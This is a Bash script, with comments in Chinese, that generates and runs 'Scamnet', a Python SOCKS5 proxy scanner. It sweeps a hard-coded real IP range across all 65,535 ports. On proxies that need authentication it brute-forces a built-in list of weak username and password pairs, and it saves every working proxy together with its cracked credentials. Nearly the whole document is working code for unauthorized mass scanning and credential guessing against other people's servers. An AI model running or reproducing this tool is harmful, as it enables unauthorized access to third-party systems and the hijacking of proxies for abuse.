#!/bin/bash
# main.sh - Scamnet OTC SOCKS5 扫描器（完整自包含版）
# 端口已改为默认 1-65535 全端口扫描（已修复 !range 解析 + 真实进度）
# TG: @soqunla | GitHub: https://github.com/avotcorg/scamnet

set -e

# ==================== 颜色 & 日志 ====================
RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; NC='\033[0m'
LOG_DIR="logs"; mkdir -p "$LOG_DIR"
LOG="$LOG_DIR/scanner_$(date +%Y%m%d_%H%M%S).log"
log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG"; }

echo -e "${GREEN}[OTC] Scamnet 完整启动器 v2.3 (真实扫描进度修复)${NC}"
echo "日志 → $LOG"

# ==================== 内嵌 requirements.txt ====================
REQUIREMENTS_CONTENT="
requests>=2.28.0
tqdm>=4.64.0
PyYAML>=6.0
ipaddress>=1.0.23
"

# ==================== 安装依赖（国内镜像）================
if [ ! -f ".deps_installed" ]; then
    echo -e "${YELLOW}[*] 安装依赖（清华源）...${NC}"
    echo "$REQUIREMENTS_CONTENT" > /tmp/scamnet_reqs.txt
    if ! command -v pip3 &>/dev/null; then
    echo -e "${RED}[!] pip3 未安装，尝试自动安装...${NC}"
    if command -v apt >/dev/null; then
        apt update -qq && apt install -y python3-pip >>"$LOG" 2>&1
    elif command -v yum >/dev/null; then
        yum install -y python3-pip >>"$LOG" 2>&1
    elif command -v apk >/dev/null; then
        apk add py3-pip >>"$LOG" 2>&1
    else
        echo -e "${RED}[!] 不支持的系统，无法自动安装 pip3${NC}"
        exit 1
    fi
fi
pip3 install --user -i https://pypi.tuna.tsinghua.edu.cn/simple \
    -r /tmp/scamnet_reqs.txt --no-warn-script-location 2>&1 | tee -a "$LOG"
rm -f /tmp/scamnet_reqs.txt
touch .deps_installed
log "依赖安装完成"
else
log "依赖已安装"
fi

# ==================== 创建 config.yaml（全端口 1-65535）================
cat > config.yaml << 'EOF'
# Scamnet 配置
range: "157.254.32.0-157.254.52.255"
ports: !range 1-65535    # 正确使用 !range 语法
timeout: 6.0
workers: 300
EOF
log "config.yaml 已创建（全端口 1-65535）"

# ==================== scanner.py（关键修复：真实等待任务完成）================
cat > scanner.py << 'PY'
import sys, os; sys.path.append(os.path.dirname(__file__))
import yaml
from yaml import SafeLoader
from plugins import load_plugins
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket, ipaddress, threading, time
from tqdm import tqdm

# ==================== 注册 !range 构造器 ====================
def range_constructor(loader, node):
    value = loader.construct_scalar(node)
    start, end = map(int, value.split('-'))
    return list(range(start, end + 1))
yaml.add_constructor('!range', range_constructor, Loader=SafeLoader)

# ==================== 加载配置 ====================
with open('config.yaml') as f:
    cfg = yaml.load(f, Loader=SafeLoader)

INPUT_RANGE = cfg['range']
RAW_PORTS = cfg['ports']
TIMEOUT = cfg.get('timeout', 6.0)
MAX_WORKERS = cfg.get('workers', 300)

# 解析端口
if isinstance(RAW_PORTS, list):
    PORTS = RAW_PORTS
else:
    print(f"[!] 端口解析失败，使用默认 [1080]")
    PORTS = [1080]

print(f"[DEBUG] 端口数量: {len(PORTS)} (期望: 65535)")

# ==================== 全局变量 ====================
file_lock = threading.Lock()
valid_count = 0
plugins = load_plugins()

# ==================== 核心函数 ====================
def test_proxy(ip: str, port: int):
    result = {'ip':ip, 'port':port, 'status':'FAIL', 'country':'XX', 'latency':'-', 'export_ip':'-', 'auth':''}
    ok, latency, export_ip = is_socks5_available(ip, port, None, None)
    if ok:
        country = get_country(export_ip) or get_country(ip)
        result.update({'status':'OK', 'country':country, 'latency':f'{latency}ms', 'export_ip':export_ip})
    else:
        auth_mod = plugins.get('auth_weak')
        if auth_mod:
            auth = auth_mod.brute(ip, port)
            if auth:
                user, pwd = auth
                ok, latency, export_ip = is_socks5_available(ip, port, user, pwd)
                if ok:
                    country = get_country(export_ip) or get_country(ip)
                    result.update({'status':'OK (Weak)', 'country':country, 'latency':f'{latency}ms', 'export_ip':export_ip, 'auth':f'{user}:{pwd}'})
    plugins['output_file'].save_detail(result)
    if result['status'].startswith('OK'):
        with file_lock:
            global valid_count
            valid_count += 1
        plugins['output_file'].save_valid(result)

def get_country(ip):
    for name in ['geo_ipapi']:
        if name in plugins and (c := plugins[name].get(ip)):
            return c
    return 'XX'

def is_socks5_available(ip, port, user=None, pwd=None):
    try:
        with socket.create_connection((ip, port), timeout=TIMEOUT) as sock:
            sock.settimeout(TIMEOUT)
            methods = b'\x05\x02\x00\x02' if user and pwd else b'\x05\x01\x00'
            sock.sendall(methods)
            resp = sock.recv(2)
            if len(resp) != 2 or resp[0] != 5: return False,0,None
            method = resp[1]
            if method == 0: pass
            elif method == 2 and user and pwd:
                auth = b'\x01' + bytes([len(user)]) + user.encode() + bytes([len(pwd)]) + pwd.encode()
                sock.sendall(auth)
                if sock.recv(2)[1] != 0: return False,0,None
            else: return False,0,None
            target = socket.inet_aton(socket.gethostbyname('ifconfig.me')) + b'\x00\x50'
            sock.sendall(b'\x05\x01\x00\x01' + target)
            if sock.recv(10)[1] != 0: return False,0,None
            sock.sendall(b'GET / HTTP/1.1\r\nHost: ifconfig.me\r\n\r\n')
            resp = b''
            start = time.time()
            while time.time() - start < TIMEOUT:
                try:
                    chunk = sock.recv(1024)
                    if not chunk: break
                    resp += chunk
                    if b'\r\n\r\n' in resp: break
                except: break
            export_ip = resp.split(b'\r\n\r\n',1)[1].decode(errors='ignore').split()[0] if b'\r\n\r\n' in resp else 'Unknown'
            return True, round((time.time()-start)*1000), export_ip
    except: return False,0,None

# ==================== 主函数（关键修复）===================
def main():
    print('[OTC] 扫描启动')
    start_ip = int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[0]))
    end_ip = int(ipaddress.IPv4Address(INPUT_RANGE.split('-')[1]))
    ips = [str(ipaddress.IPv4Address(i)) for i in range(start_ip, end_ip + 1)]
    total = len(ips) * len(PORTS)
    print(f'IP: {len(ips):,}, 端口: {len(PORTS):,}, 总任务: {total:,}')

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as exe:
        # 提交所有任务
        futures = [exe.submit(test_proxy, ip, port) for ip in ips for port in PORTS]
        # 真实等待 + 真实进度
        for future in tqdm(as_completed(futures), total=total, desc='扫描', unit='port', ncols=100):
            future.result()  # 确保任务完成

    print(f'\n[+] 完成！发现 {valid_count} 个可用代理')

if __name__ == '__main__': main()
PY
log "scanner.py 已写入（真实进度修复）"

# ==================== 创建 plugins 目录 & 插件（保持不变）===================
mkdir -p plugins
cat > plugins/__init__.py << 'EOF'
import importlib, os
def load_plugins():
    plugins = {}
    path = os.path.dirname(__file__)
    for file in os.listdir(path):
        if file.endswith('.py') and file not in ['__init__.py']:
            name = file[:-3]
            module = importlib.import_module(f'plugins.{name}')
            plugins[name] = module
    return plugins
EOF

cat > plugins/auth_weak.py << 'EOF'
WEAK_PASSWORDS = [
    "123:123", "111:111", "1:1", "qwe123:qwe123", "abc:abc", "aaa:aaa",
    "1234:1234", "admin:admin", "socks5:socks5", "123456:123456",
    "12345678:12345678", "admin123:admin", "proxy:proxy", "admin:123456", "root:root",
    "12345:12345", "test:test", "user:user", "guest:guest", "admin:", "888888:888888",
    "test123:test123", "qwe:qwe", "qwer:qwer", "11:11", "222:222", "2:2", "3:3",
    "12349:12349", "user:123", "user:1234", "user:12345", "user:123456"
]
def brute(ip: str, port: int):
    from scanner import is_socks5_available, TIMEOUT
    for pair in WEAK_PASSWORDS:
        u,p = pair.split(':')
        ok,_,_ = is_socks5_available(ip,port,u,p)
        if ok: return u,p
    return None
EOF

cat > plugins/geo_ipapi.py << 'EOF'
import requests
def get(ip: str):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=countryCode', timeout=6)
        if r.status_code == 200:
            code = r.json().get('countryCode','').strip().upper()
            if len(code)==2 and code.isalpha():
                print(f'[GEO] {ip} → {code}')
                return code
    except: pass
    return None
EOF

cat > plugins/output_file.py << 'EOF'
import threading
file_lock = threading.Lock()
valid_count = 0
def save_detail(r):
    line = f'{r["ip"]}:{r["port"]} | {r["status"]} | {r["country"]} | {r["latency"]} | {r["export_ip"]} | {r["auth"]}'
    with file_lock:
        with open('result_detail.txt','a',encoding='utf-8') as f: f.write(line+'\\n')
def save_valid(r):
    global valid_count
    valid_count += 1
    auth = r["auth"]
    fmt = f'socks5://{auth}@{r["ip"]}:{r["port"]}#{r["country"]}' if auth else f'socks5://{r["ip"]}:{r["port"]}#{r["country"]}'
    with file_lock:
        with open('socks5_valid.txt','a',encoding='utf-8') as f: f.write(fmt+'\\n')
    print(f'[+] 发现 #{valid_count}: {fmt}')
EOF

log "所有插件已创建"

# ==================== 初始化结果文件 ====================
echo "# Scamnet 扫描日志 $(date)" > result_detail.txt
echo "# socks5://user:pass@ip:port#CN" > socks5_valid.txt
log "结果文件初始化"

# ==================== 启动扫描 ====================
echo -e "${GREEN}[*] 启动扫描 (157.254.32.0-157.254.52.255, 全端口 1-65535)...${NC}"
python3 scanner.py 2>&1 | tee -a "$LOG"

# ==================== 完成报告 ====================
VALID=$(grep -c "^socks5://" socks5_valid.txt || echo 0)
echo -e "${GREEN}[+] 扫描完成！发现 ${VALID} 个可用 SOCKS5${NC}"
echo "  详细 → result_detail.txt"
echo "  有效 → socks5_valid.txt"
log "扫描结束: $VALID 个代理"
echo -e "${GREEN}[*] 全部完成！再次运行: ./main.sh${NC}"
